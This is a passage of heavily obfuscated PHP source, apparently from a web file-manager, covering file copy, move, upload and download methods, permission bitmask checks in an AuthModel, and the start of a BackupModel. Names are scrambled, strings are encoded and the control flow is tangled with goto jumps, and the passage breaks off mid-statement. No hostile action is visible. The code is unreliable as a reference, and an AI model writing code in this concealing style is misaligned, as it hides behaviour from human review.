$déÆ»ÂÀØâ, $a‰·ğø”… = REPEAT_REPLACE) { $fôôËğ˜× =& $_SERVER[£¶ä½¶¢]; $aÙÅ‚õËŠ = $this->parse($déÆ»ÂÀØâ); $aĞ‹¸ñÆÕ = $this->model->copy($C¯İ³Ş¯êœ, $aÙÅ‚õËŠ[$fôôËğ˜×[401]], $a‰·ğø”…, $aÙÅ‚õËŠ[$fôôËğ˜×[86]]); return $aĞ‹¸ñÆÕ ? $this->getPathOuter($aĞ‹¸ñÆÕ) : !1; } public function moveFile($DêÀŞ·ŸƒÜ, $B¶´²µèÊô, $dßƒ ‚°¼Û = REPEAT_REPLACE) { $C¡¼–‹Ç•¤ =& $_SERVER[£¶ä½¶¢]; $cİ‚…¹µ±© = $this->parse($B¶´²µèÊô); $cßÎ‚ÏèÊ“ = $this->model->move($DêÀŞ·ŸƒÜ, $cİ‚…¹µ±©[$C¡¼–‹Ç•¤[401]], $dßƒ ‚°¼Û, $cİ‚…¹µ±©[$C¡¼–‹Ç•¤[86]]); return $cßÎ‚ÏèÊ“ ? $this->getPathOuter($cßÎ‚ÏèÊ“) : !1; } public function copy($BÍÓØîÌ©ê, $fÚ£Ÿãëàî, $d¼íî©Œ = REPEAT_REPLACE) { $E¡×ò‘µ¤” = $this->parse($fÚ£Ÿãëàî); $F‚éÙ¶åÄ¢ = $this->model->copy($BÍÓØîÌ©ê, $E¡×ò‘µ¤”[$_SERVER[£¶ä½¶¢][401]], $d¼íî©Œ); return $F‚éÙ¶åÄ¢ ? $this->getPathOuter($F‚éÙ¶åÄ¢) : !1; } public function moveSameAllow() { } public function move($bÊõ‘Ê§Ã, $A½éÁôˆØƒ, $dÁ³ìÆ†Š = REPEAT_REPLACE) { $eê¸¨Ì‚á¥ = $this->parse($A½éÁôˆØƒ); $fêÓ®‡ßÑ­ = $this->model->move($bÊõ‘Ê§Ã, $eê¸¨Ì‚á¥[$_SERVER[£¶ä½¶¢][401]], $dÁ³ìÆ†Š); return $fêÓ®‡ßÑ­ ? $this->getPathOuter($fêÓ®‡ßÑ­) : !1; } public function remove($fÌ·½µ÷”å, $f¾‚¸»“‰Î = true) { return $this->model->remove($fÌ·½µ÷”å, $f¾‚¸»“‰Î); } public function rename($DÌ˜™°ç, $E†ÜÊ¦ÒÖŞ) { $a®Ö©­ÒŒ¹ = $this->model->rename($DÌ˜™°ç, $E†ÜÊ¦ÒÖŞ); return $a®Ö©­ÒŒ¹ ? $this->getPathOuter($DÌ˜™°ç) : $a®Ö©­ÒŒ¹; } public function size($D÷ø•İ•®) { $F’Ë´¼â„‘ = $this->infoSimple($D÷ø•İ•®); return $F’Ë´¼â„‘ ? $F’Ë´¼â„‘[$_SERVER[£¶ä½¶¢][88]] : 0; } public function infoSimple($eâÈ˜ç‡) { return $this->model->sourceInfo($eâÈ˜ç‡); } public function info($a¼èÉÎ­Š¯) { return $this->infoParse($a¼èÉÎ­Š¯); } public function infoAuth($d³˜ã¥¹) { return $this->infoParse($d³˜ã¥¹, !1, !0); } public function infoWithChildren($dÔ›àêİ«Ó) { return $this->infoParse($dÔ›àêİ«Ó, !0); } protected function infoParse($D´‰²ˆ¤Í‡, $b†‚ÛÜãÃå = false, $Aæ‚±í†Õç = false) { if (!$b†‚ÛÜãÃå) { return $this->model->pathInfo($D´‰²ˆ¤Í‡, $Aæ‚±í†Õç); } return $this->model->pathInfoMore($D´‰²ˆ¤Í‡); } public function infoFull($Eˆ²Ô„‘ìé) { $Eáì²«ãÅ„ =& $_SERVER[£¶ä½¶¢]; $dæ›•Ãó²™ = explode($Eáì²«ãÅ„[18], $Eˆ²Ô„‘ìé); $a‚ÉåéàÅÓ = implode($Eáì²«ãÅ„[18], array_splice($dæ›•Ãó²™, 1)); return $this->model->pathInfoByPath($dæ›•Ãó²™[0], $a‚ÉåéàÅÓ); } public function hashSimple($a­†é†ÛŒù) { $F“çÌò§ˆ =& $_SERVER[£¶ä½¶¢]; $EÜ…»“–†¦ = $this->infoWithChildren($a­†é†ÛŒù); return $EÜ…»“–†¦[$F“çÌò§ˆ[174]][$F“çÌò§ˆ[181]]; } public function hashMd5($d‡Í–³°) { $a†ôÇíÉÃ =& $_SERVER[£¶ä½¶¢]; $dœ¨òÁäö» = $this->infoWithChildren($d‡Í–³°); return $dœ¨òÁäö»[$a†ôÇíÉÃ[174]][$a†ôÇíÉÃ[180]]; } public function exist($f‚‘Ò‚á“¡) { $Dï¤Ûí› =& $_SERVER[£¶ä½¶¢]; $fóŒâœåâó = $this->parse($f‚‘Ò‚á“¡); if (!$fóŒâœåâó[$Dï¤Ûí›[86]]) { return $this->isFile($f‚‘Ò‚á“¡) || $this->isFolder($f‚‘Ò‚á“¡); } $A‚Ô™Œè’Ì = array($Dï¤Ûí›[402] => $fóŒâœåâó[$Dï¤Ûí›[401]], $Dï¤Ûí›[38] => $fóŒâœåâó[$Dï¤Ûí›[86]]); $B›¦»×£±× = $this->model->where($A‚Ô™Œè’Ì)->find(); return $B›¦»×£±× ? !0 : !1; } public function isFile($a®ŒíÚ¾…ì) { $b®Ø…†³Şë =& $_SERVER[£¶ä½¶¢]; $e ‹¯´ÒÙ¼ = $this->infoSimple($a®ŒíÚ¾…ì); return $e ‹¯´ÒÙ¼ && $e ‹¯´ÒÙ¼[$b®Ø…†³Şë[411]] == $b®Ø…†³Şë[97] ? !1 : !0; } public function isFolder($eÂ·©»¾¿ç) { $C’ö» =& $_SERVER[£¶ä½¶¢]; $F¦âä‰ËïÆ = $this->infoSimple($eÂ·©»¾¿ç); return $F¦âä‰ËïÆ && $F¦âä‰ËïÆ[$C’ö»[411]] == $C’ö»[97] ? !0 : !1; } public function listPath($e¢«Êˆµ½“, $c÷ĞİŸÃ = false) { $cµÂ‚èõ’× =& $_SERVER[£¶ä½¶¢]; if ($e¢«Êˆµ½“ == $cµÂ‚èõ’×[43]) { return !1; } $f‚Ÿ†æåÍÄ = array($cµÂ‚èõ’×[402] => $e¢«Êˆµ½“); if ($c÷ĞİŸÃ) { return $this->model->listSource($f‚Ÿ†æåÍÄ, -1); } return $this->model->listSource($f‚Ÿ†æåÍÄ); } public function has($e£Îâ©Ä‡, $a¥­ÎÙ’„ = false, $bÁƒÑ…†ËÜ = null) { $b£ŸÄâÑŞ° =& $_SERVER[£¶ä½¶¢]; $C¹µ¤õÅ²œ = $this->infoWithChildren($e£Îâ©Ä‡); if ($a¥­ÎÙ’„) { return array($b£ŸÄâÑŞ°[214] => $C¹µ¤õÅ²œ[$b£ŸÄâÑŞ°[214]], $b£ŸÄâÑŞ°[213] => $C¹µ¤õÅ²œ[$b£ŸÄâÑŞ°[213]]); } return $bÁƒÑ…†ËÜ ? $C¹µ¤õÅ²œ[$b£ŸÄâÑŞ°[214]] : $C¹µ¤õÅ²œ[$b£ŸÄâÑŞ°[213]]; } public function listAll($bôˆ¬¯Ñîˆ) { $bµ‘§æ…È² = IO::info($this->pathParse[$_SERVER[£¶ä½¶¢][86]]); if (!$bµ‘§æ…È²) { return array(); } return $this->model->listAll($bôˆ¬¯Ñîˆ); } public function getContent($AÙ¡ÌÙ…Î) { return $this->model->getContent($AÙ¡ÌÙ…Î); } public function setContent($cºÙåóßÏà, $a“¼¦‡Ôñ = '') { return $this->model->setContent($cºÙåóßÏà, $a“¼¦‡Ôñ); } public function fileSubstr($dôÈ¶„•ö™, $e¢ì¯Š»ç¹, $cß“Ş•œ) { return $this->model->fileSubstr($dôÈ¶„•ö™, $e¢ì¯Š»ç¹, $cß“Ş•œ); } public function download($CâºÃ¸è , $EÃÀ…æ»«£ = '') { $eª›àñ‡§ = get_path_father($EÃÀ…æ»«£); $A’ß‡³æÃ = get_path_this($EÃÀ…æ»«£); $cõ­‚” = $this->model->fileInfoGet($CâºÃ¸è ); $e¯´¸»Ö‰ = IO::copy($cõ­‚”[$_SERVER[£¶ä½¶¢][86]], $eª›àñ‡§, !1, $A’ß‡³æÃ); return $e¯´¸»Ö‰; } public function setModifyTime($aˆ¯÷®âó™, $c¥©‰õ¾™ê = '') { $cœ—…ğ›äº =& $_SERVER[£¶ä½¶¢]; if (!$aˆ¯÷®âó™) { return; } $this->model->where(array($cœ—…ğ›äº[418] => $aˆ¯÷®âó™))->save(array($cœ—…ğ›äº[94] => $c¥©‰õ¾™ê)); } public function upload($D§¹£àŠª·, $bİÅğ•†Ø¥, $a»ÓÁ¬¤ô = false, $bç¢‡ğÁß = REPEAT_REPLACE) { $AêÜÆ —Š› =& $_SERVER[£¶ä½¶¢]; $aºÊ©ÙÂâà = $this->parse($D§¹£àŠª·); $Fùä§†† = $this->model->addFile($aºÊ©ÙÂâà[$AêÜÆ —Š›[401]], $bİÅğ•†Ø¥, $aºÊ©ÙÂâà[$AêÜÆ —Š›[86]], $a»ÓÁ¬¤ô, $bç¢‡ğÁß); return $this->getPathOuter($Fùä§††); } public function uploadFileByID($F—œâåâí, $EÂ›ŞÒâã¹, $a£»ÏìÉ²¯) { $dßßÇšöª =& $_SERVER[£¶ä½¶¢]; $C™Ó·Ú½ã° = $this->parse($F—œâåâí); $B×ê‡´í˜‹ = $this->model->addFileByFileID($C™Ó·Ú½ã°[$dßßÇšöª[401]], $EÂ›ŞÒâã¹, $C™Ó·Ú½ã°[$dßßÇšöª[86]], $a£»ÏìÉ²¯); return $this->getPathOuter($B×ê‡´í˜‹); } public function addFileByRemote($eÈŠîÉÀ•–, $F©ÊÔŒÛÌ×, $CÕÑëØğÀ‰ = array(), $dŸÕ±—ÙÕ‚ = '', $e¸ÙÛ»„) { $f÷¯ÍÔ¸êå =& $_SERVER[£¶ä½¶¢]; $F¿öóİ……× = $this->parse($eÈŠîÉÀ•–); $dŸÕ±—ÙÕ‚ = empty($dŸÕ±—ÙÕ‚) ? $F¿öóİ……×[$f÷¯ÍÔ¸êå[86]] : $dŸÕ±—ÙÕ‚; $aİ”•‡„ïĞ = $this->model->addFileByRemote($F¿öóİ……×[$f÷¯ÍÔ¸êå[401]], $F©ÊÔŒÛÌ×, $dŸÕ±—ÙÕ‚, $CÕÑëØğÀ‰, $e¸ÙÛ»„); return $this->getPathOuter($aİ”•‡„ïĞ); } public function uploadLink($d…¤á· ÀÎ, $Aä¾™å± = 0) { $c‰âÍÓ¦Ø— =& $_SERVER[£¶ä½¶¢]; $EâÒ‚å¿ˆì = $this->parse($d…¤á· ÀÎ); $aÍÑÉˆƒÏ = _get($GLOBALS[$c‰âÍÓ¦Ø—[17]], $c‰âÍÓ¦Ø—[1205]); $e·Ø”ì»Š¿ = _get($GLOBALS[$c‰âÍÓ¦Ø—[17]], $c‰âÍÓ¦Ø—[1206]); $d…¤á· ÀÎ = Model($c‰âÍÓ¦Ø—[579])->createFileName($EâÒ‚å¿ˆì[$c‰âÍÓ¦Ø—[86]], $aÍÑÉˆƒÏ, $e·Ø”ì»Š¿); return IO::uploadLink($d…¤á· ÀÎ, $Aä¾™å±); } public function fileNameAuto($bÆ‹ÖÄ¼‰‡, $eÖåÄ…øÂ», $bÑäÁ›¯È“ = REPEAT_REPLACE, $aéŠ¢§Ş» = false) { return $this->model->fileNameAuto($bÆ‹ÖÄ¼‰‡, $eÖåÄ…øÂ», $bÑäÁ›¯È“, $aéŠ¢§Ş»); } public function fileNameExist($b‹·šŸ›, $d®‡ƒ½Š‹) { return $this->model->fileNameExist($b‹·šŸ›, $d®‡ƒ½Š‹); } protected function _fileOut($cÌäÇ‘íß¤, $eµğÑìÉ¸é = false, $D¦Ç¦£¶ğÅ = false, $eö‘ÅÊ“Ñ¥ = '', $a‡«ƒ ¶½” = false) { goto C‘Å–Ö°ñ; D¦È¹ò¢Õ¥: $F’•ãÎ¨Çó = $this->model->fileInfoGet($cÌäÇ‘íß¤); $eö‘ÅÊ“Ñ¥ = $F’•ãÎ¨Çó[$b‘æÄ„Çì®[180]] ? $F’•ãÎ¨Çó[$b‘æÄ„Çì®[180]] : $eö‘ÅÊ“Ñ¥; $C˜†ê‚´¾õ = isset($GLOBALS[$b‘æÄ„Çì®[1208]]) ? $GLOBALS[$b‘æÄ„Çì®[1208]] : $A‹¾ê±á¶[$b‘æÄ„Çì®[38]]; goto eËƒ¨ê•‚; C‘Å–Ö°ñ: $b‘æÄ„Çì® =& $_SERVER[£¶ä½¶¢]; $A‹¾ê±á¶ = $this->model->sourceInfo($cÌäÇ‘íß¤); if ($A‹¾ê±á¶[$b‘æÄ„Çì®[411]] == $b‘æÄ„Çì®[97]) { header($b‘æÄ„Çì®[1207]); die; } goto D¦È¹ò¢Õ¥; eËƒ¨ê•‚: if ($a‡«ƒ ¶½”) { return IO::fileOutServer($F’•ãÎ¨Çó[$b‘æÄ„Çì®[86]], $eµğÑìÉ¸é, $C˜†ê‚´¾õ, $eö‘ÅÊ“Ñ¥); } IO::fileOut($F’•ãÎ¨Çó[$b‘æÄ„Çì®[86]], $eµğÑìÉ¸é, $C˜†ê‚´¾õ, $eö‘ÅÊ“Ñ¥); goto Cò‘…ğ›ø; Cò‘…ğ›ø: } public function fileOut($e·òİŠä…–, $AòùÈš”ÆÜ = false, $D¸—àéº†ï = false, $f¦”ƒÑÉãƒ = '') { $this->_fileOut($e·òİŠä…–, $AòùÈš”ÆÜ, $D¸—àéº†ï, $f¦”ƒÑÉãƒ); } public function fileOutServer($Dùí¨èÂè, $AÓŞ·†³ä… = false, $A¨¯ŸÍÂÏ = false, $cÍ”çÄ´Ëª = '') { $this->_fileOut($Dùí¨èÂè, $AÓŞ·†³ä…, $A¨¯ŸÍÂÏ, $cÍ”çÄ´Ëª, !0); } protected function _fileOutImage($b¿ï¤ÛÕ®Ú, $BÜƒ¹’å¬¸ = 250) { goto bâ²…ŠÕ‘İ; B¨Äö¼İ¸Ì: $bÕù¼¨«†Í = $this->model->fileInfoGet($b¿ï¤ÛÕ®Ú); $bÕù¼¨«†Í[$F¶Ÿ»î½Ó[38]] = $E‡  ¬Æã¿[$F¶Ÿ»î½Ó[38]]; $bÕù¼¨«†Í[$F¶Ÿ»î½Ó[173]] = $E‡  ¬Æã¿[$F¶Ÿ»î½Ó[173]]; goto e³Õ‹ìâŞ; e³Õ‹ìâŞ: $GLOBALS[$F¶Ÿ»î½Ó[1208]] = $bÕù¼¨«†Í[$F¶Ÿ»î½Ó[38]]; $GLOBALS[$F¶Ÿ»î½Ó[172]] = $bÕù¼¨«†Í; IO::fileOutImage($bÕù¼¨«†Í[$F¶Ÿ»î½Ó[86]], $BÜƒ¹’å¬¸); goto cõ°»“§; bâ²…ŠÕ‘İ: $F¶Ÿ»î½Ó =& $_SERVER[£¶ä½¶¢]; $E‡  ¬Æã¿ = $this->model->pathInfo($b¿ï¤ÛÕ®Ú); if ($E‡  ¬Æã¿[$F¶Ÿ»î½Ó[411]] == $F¶Ÿ»î½Ó[97]) { show_json($F¶Ÿ»î½Ó[1209] . $b¿ï¤ÛÕ®Ú, !1); } goto B¨Äö¼İ¸Ì; cõ°»“§: } public function fileOutImage($aÂ†Ğ™™ïœ, $BÛ¦ğ¡¡Å = 250) { $this->_fileOutImage($aÂ†Ğ™™ïœ, $BÛ¦ğ¡¡Å); } public function fileOutImageServer($a¥«Ş²àğÊ, $aíˆ£éƒò‡ = 250) { $this->_fileOutImage($a¥«Ş²àğÊ, $aíˆ£éƒò‡); } public function link($CŞÀ°¡‚ç, $F¤¼Á¬î­ã = '') { $D«òíÑ¶Â¸ = $this->model->fileInfoGet($CŞÀ°¡‚ç); return IO::link($D«òíÑ¶Â¸[$_SERVER[£¶ä½¶¢][86]], $F¤¼Á¬î­ã); } protected function parse($B¸¦áçÃŞ›) { $BºîÅÑìÇÊ =& $_SERVER[£¶ä½¶¢]; if (strstr($B¸¦áçÃŞ›, $BºîÅÑìÇÊ[18]) === !1) { return array($BºîÅÑìÇÊ[420] => intval($B¸¦áçÃŞ›), $BºîÅÑìÇÊ[86] => $BºîÅÑìÇÊ[43], $BºîÅÑìÇÊ[1204] => array()); } $E‘†³Á˜ùç = explode($BºîÅÑìÇÊ[18], trim($B¸¦áçÃŞ›, $BºîÅÑìÇÊ[18])); if (count($E‘†³Á˜ùç) < 2) { show_tips($B¸¦áçÃŞ› . $BºîÅÑìÇÊ[1210]); } return array($BºîÅÑìÇÊ[420] => intval($E‘†³Á˜ùç[0]), $BºîÅÑìÇÊ[86] => $E‘†³Á˜ùç[1], $BºîÅÑìÇÊ[1204] => array_slice($E‘†³Á˜ùç, 1)); } } goto A‰ôÁÎ²«ö; DÜÕê¹æêÁ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $e¬Ù‘àï»ˆ =& $_SERVER[£¶ä½¶¢]; $Cš™Õ®— = array(array($e¬Ù‘àï»ˆ[421] => LNG($e¬Ù‘àï»ˆ[1691]), $e¬Ù‘àï»ˆ[1692] => $e¬Ù‘àï»ˆ[1693], $e¬Ù‘àï»ˆ[1694] => 1, $e¬Ù‘àï»ˆ[1695] => 1, $e¬Ù‘àï»ˆ[1696] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($e¬Ù‘àï»ˆ[421] => LNG($e¬Ù‘àï»ˆ[1697]), $e¬Ù‘àï»ˆ[1692] => $e¬Ù‘àï»ˆ[1698], $e¬Ù‘àï»ˆ[1694] => 2, $e¬Ù‘àï»ˆ[1695] => 1, $e¬Ù‘àï»ˆ[1696] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($e¬Ù‘àï»ˆ[421] => LNG($e¬Ù‘àï»ˆ[1699]), $e¬Ù‘àï»ˆ[1692] => $e¬Ù‘àï»ˆ[1700], $e¬Ù‘àï»ˆ[1694] => 3, $e¬Ù‘àï»ˆ[1695] => 1, $e¬Ù‘àï»ˆ[1696] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($e¬Ù‘àï»ˆ[421] => LNG($e¬Ù‘àï»ˆ[1701]), $e¬Ù‘àï»ˆ[1692] => $e¬Ù‘àï»ˆ[1702], $e¬Ù‘àï»ˆ[1694] => 4, $e¬Ù‘àï»ˆ[1695] => 1, $e¬Ù‘àï»ˆ[1696] => self::AUTH_SHOW | self::AUTH_VIEW), array($e¬Ù‘àï»ˆ[421] => LNG($e¬Ù‘àï»ˆ[1703]), $e¬Ù‘àï»ˆ[1692] => $e¬Ù‘àï»ˆ[1704], $e¬Ù‘àï»ˆ[1694] => 5, $e¬Ù‘àï»ˆ[1695] => 1, $e¬Ù‘àï»ˆ[1696] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($e¬Ù‘àï»ˆ[421] => LNG($e¬Ù‘àï»ˆ[1705]), $e¬Ù‘àï»ˆ[1692] => $e¬Ù‘àï»ˆ[1706], $e¬Ù‘àï»ˆ[1694] => 6, $e¬Ù‘àï»ˆ[1695] => 1, $e¬Ù‘àï»ˆ[1696] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($e¬Ù‘àï»ˆ[421] => LNG($e¬Ù‘àï»ˆ[1707]), $e¬Ù‘àï»ˆ[1692] => $e¬Ù‘àï»ˆ[1708], $e¬Ù‘àï»ˆ[1694] => 7, $e¬Ù‘àï»ˆ[1695] => 1, $e¬Ù‘àï»ˆ[1696] => 0)); return $Cš™Õ®—; } public static function authCheck($c¹íïğğµÕ, $cÃ¡¾¾òØ) { $c¹íïğğµÕ = intval($c¹íïğğµÕ); if ($GLOBALS[$_SERVER[£¶ä½¶¢][493]]) { return !0; } if ($c¹íïğğµÕ <= 0) { return !1; } if (($c¹íïğğµÕ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($c¹íïğğµÕ & $cÃ¡¾¾òØ); } public static function authCheckShow($e–¦¨¾“‡š) { return self::authCheck($e–¦¨¾“‡š, self::AUTH_SHOW); } public static function authCheckView($e–·Ÿ…ëÁç) { return self::authCheck($e–·Ÿ…ëÁç, self::AUTH_VIEW); } public static function authCheckDownload($cŞàİ¹¾Ğ¬) { return self::authCheck($cŞàİ¹¾Ğ¬, self::AUTH_DOWNLOAD); } public static function authCheckUpload($bšÕ£¹·¾) { return self::authCheck($bšÕ£¹·¾, self::AUTH_UPLOAD); } public static function authCheckEdit($DâÄùˆùÇ‰) { return self::authCheck($DâÄùˆùÇ‰, self::AUTH_EDIT); } public static function authCheckRemove($FÁí´‘Ò™) { return self::authCheck($FÁí´‘Ò™, self::AUTH_REMOVE); } public static function authCheckShare($bÖó…˜ÆÀ) { return self::authCheck($bÖó…˜ÆÀ, self::AUTH_SHARE); } public static function authCheckComment($A×’•¨Ãòš) { return self::authCheck($A×’•¨Ãòš, self::AUTH_COMMENT); } public static function authCheckEvent($Bá‚˜Ù›ŠÀ) { return self::authCheck($Bá‚˜Ù›ŠÀ, self::AUTH_EVENT); } public static function authCheckRoot($dšÃ„¿¶™Ñ) { return self::authCheck($dšÃ„¿¶™Ñ, self::AUTH_ROOT); } public static function authCheckAction($A²°•º§î½, $eà®õ”ÙŸĞ) { goto eŒœ¢šööô; Cää‚³É±: $bÌ’äïõ†É = $e…½‰’à¸“[$eà®õ”ÙŸĞ]; $A²°•º§î½ = intval($A²°•º§î½); if ($A²°•º§î½ <= 0) { return !1; } goto a¾ÄğâÄ›ñ; a¾ÄğâÄ›ñ: if (($A²°•º§î½ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($A²°•º§î½ & $bÌ’äïõ†É); goto Eò¥ŠšÙ±; eŒœ¢šööô: $EÕ›æó¤æ„ =& $_SERVER[£¶ä½¶¢]; $e…½‰’à¸“ = array($EÕ›æó¤æ„[1709] => self::AUTH_VIEW, $EÕ›æó¤æ„[1092] => self::AUTH_DOWNLOAD, $EÕ›æó¤æ„[117] => self::AUTH_UPLOAD, $EÕ›æó¤æ„[1657] => self::AUTH_EDIT, $EÕ›æó¤æ„[1656] => self::AUTH_REMOVE, $EÕ›æó¤æ„[1667] => self::AUTH_SHARE, $EÕ›æó¤æ„[361] => self::AUTH_COMMENT, $EÕ›æó¤æ„[1515] => self::AUTH_EVENT, $EÕ›æó¤æ„[1710] => self::AUTH_ROOT); if (!isset($e…½‰’à¸“[$eà®õ”ÙŸĞ])) { return; } goto Cää‚³É±; Eò¥ŠšÙ±: } public static function authDisable($bù„¨òãù, $aÏ‰®ÛÌ¨) { if (intval($bù„¨òãù) <= 0) { return 0; } return intval($bù„¨òãù) & ~$aÏ‰®ÛÌ¨; } public $optionType = "\x53\171\163\x74\145\155\56\x73\157\165\x72\x63\x65\101\165\164\150\x4c\x69\163\164"; public $field = array("\x6e\141\155\145", "\x61\x75\x74\x68", "\154\141\142\145\154", "\x64\151\163\x70\154\x61\171", "\x73\171\x73\x74\x65\155", "\163\x6f\162\x74"); public function initData() { $Cù ¤¦öĞ× = $this->authDefault(); foreach ($Cù ¤¦öĞ× as $A¥øİÇ¯‹) { $this->add($A¥øİÇ¯‹); } } public function listData($f½¶æ°¡í = false, $få•µ¯ÏØŒ = "\x73\x6f\162\x74", $e•ŒÃ¹‹İñ = false) { return parent::listData($f½¶æ°¡í, $få•µ¯ÏØŒ, $e•ŒÃ¹‹İñ); } public function update($FƒÅÚÅÕ¡ï, $FòÔŠËùíÎ) { $f¡ô¬×ÊÓĞ =& $_SERVER[£¶ä½¶¢]; $B¯•ëÍÎ­Ä = parent::listData($FƒÅÚÅÕ¡ï); $fŒáéŒ²÷  = $this->findByName($FòÔŠËùíÎ[$f¡ô¬×ÊÓĞ[38]]); if (!$B¯•ëÍÎ­Ä || $fŒáéŒ²÷  && $fŒáéŒ²÷ [$f¡ô¬×ÊÓĞ[401]] != $B¯•ëÍÎ­Ä[$f¡ô¬×ÊÓĞ[401]]) { return !1; } $this->filterAuth($FòÔŠËùíÎ[$f¡ô¬×ÊÓĞ[414]]); return parent::update($FƒÅÚÅÕ¡ï, $FòÔŠËùíÎ); } public function remove($D„Äêò›÷) { $aÇœÜ±ò“‡ = parent::listData($D„Äêò›÷); if (!$aÇœÜ±ò“‡ || $aÇœÜ±ò“‡[$_SERVER[£¶ä½¶¢][1168]]) { return !1; } return parent::remove($D„Äêò›÷); } public function add($f¶©®¸‰à = array()) { goto C“Ñ¤Ø´ÇÉ; C“Ñ¤Ø´ÇÉ: $CßºÑÄ” =& $_SERVER[£¶ä½¶¢]; if ($this->findByName($f¶©®¸‰à[$CßºÑÄ”[38]])) { return !1; } $EÕÜæ¾°Ÿ = array($CßºÑÄ”[38] => $CßºÑÄ”[43], $CßºÑÄ”[414] => 1, $CßºÑÄ”[1711] => $CßºÑÄ”[1700], $CßºÑÄ”[1712] => 1, $CßºÑÄ”[1168] => 0, $CßºÑÄ”[1713] => 0); goto dŸ×Á¦Â§–; B—¤Ş»—: return parent::insert($f¶©®¸‰à); goto Dš¥ìÀÕ “; dŸ×Á¦Â§–: $f¶©®¸‰à = array_merge($EÕÜæ¾°Ÿ, $f¶©®¸‰à); $f¶©®¸‰à[$CßºÑÄ”[1713]] = $this->getSort(); $this->filterAuth($f¶©®¸‰à[$CßºÑÄ”[414]]); goto B—¤Ş»—; Dš¥ìÀÕ “: } private function getSort() { $C†Œ¸ªÍ× =& $_SERVER[£¶ä½¶¢]; $CÒÉÅ·Å˜ = parent::listData(); $DÌÌğ»Àƒ› = array_to_keyvalue($CÒÉÅ·Å˜, $C†Œ¸ªÍ×[43], $C†Œ¸ªÍ×[1713]); return empty($DÌÌğ»Àƒ›) ? 0 : max($DÌÌğ»Àƒ›) + 1; } private function filterAuth(&$eÀ‘Ğ‰„Õ) { goto bƒØÖ°öÓ; bƒØÖ°öÓ: if (!$eÀ‘Ğ‰„Õ) { return; } $F„µ‘ïŒÚ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Dƒ‰ÔŒß» = array(); goto c†Íá¢¢‹µ; c†Íá¢¢‹µ: foreach ($F„µ‘ïŒÚ as $FµŒ­½Û£™) { if ($eÀ‘Ğ‰„Õ & $FµŒ­½Û£™) { $Dƒ‰ÔŒß»[] = $FµŒ­½Û£™; } } if (in_array(self::AUTH_ROOT, $Dƒ‰ÔŒß»)) { $eÀ‘Ğ‰„Õ = array_sum($F„µ‘ïŒÚ); return; } $DĞêÃ…ù‚ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto Fš¡‘œëò¿; Fš¡‘œëò¿: foreach ($Dƒ‰ÔŒß» as $FµŒ­½Û£™) { if (isset($DĞêÃ…ù‚[$FµŒ­½Û£™])) { $Dƒ‰ÔŒß» = array_merge($Dƒ‰ÔŒß», $DĞêÃ…ù‚[$FµŒ­½Û£™]); } } $Dƒ‰ÔŒß»[] = self::AUTH_SHOW; $eÀ‘Ğ‰„Õ = array_sum(array_unique($Dƒ‰ÔŒß»)); goto d–­”»ìèğ; d–­”»ìèğ: } public function sort($BÏµíİêÏœ, $cßó’íÜ³à) { return parent::update($BÏµíİêÏœ, $cßó’íÜ³à); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x62\x61\x63\x6b\x75\160\114\x69\x73\164"; public $field = array("\151\x6f", "\156\141\x6d\x65", "\163\x74\x61\164\165\x73", "\x63\157\x6e\x74\x65\156\164", "\155\141\x6e\165\x61\154", "\x72\x65\x73\x75\154\164", "\x74\x69\x6d\145\106\162\x6f\155", "\164\x69\x6d\x65\124\x6f"); public function config() { goto f†Ğ¼¸‹™; EÍ£ò“Á: if (isset($Fƒ¨ùÙƒ³’[$BÂòÂöô®[207]])) { $eÌ¿ê£³­[$BÂòÂöô®[207]][$BÂòÂöô®[1500]] = $Fƒ¨ùÙƒ³’[$BÂòÂöô®[207]]; unset($Fƒ¨ùÙƒ³’[$BÂòÂöô®[207]]); } return array_merge($eÌ¿ê£³­, $Fƒ¨ùÙƒ³’); goto a­ğÑæŸ³¯; f†Ğ¼¸‹™: $BÂòÂöô® =& $_SERVER[£¶ä½¶¢]; $Fƒ¨ùÙƒ³’ = Model($BÂòÂöô®[738])->get($BÂòÂöô®[750]); $Fƒ¨ùÙƒ³’ = json_decode($Fƒ¨ùÙƒ³’, !0); goto D²ä‡îá†˜; Céë†×»ç: $eÌ¿ê£³­ = Model($BÂòÂöô®[1716])->findByKey($BÂòÂöô®[1515], $C¤¡Ù¹šËˆ); if (!$eÌ¿ê£³­) { $eÌ¿ê£³­ = array(); } if 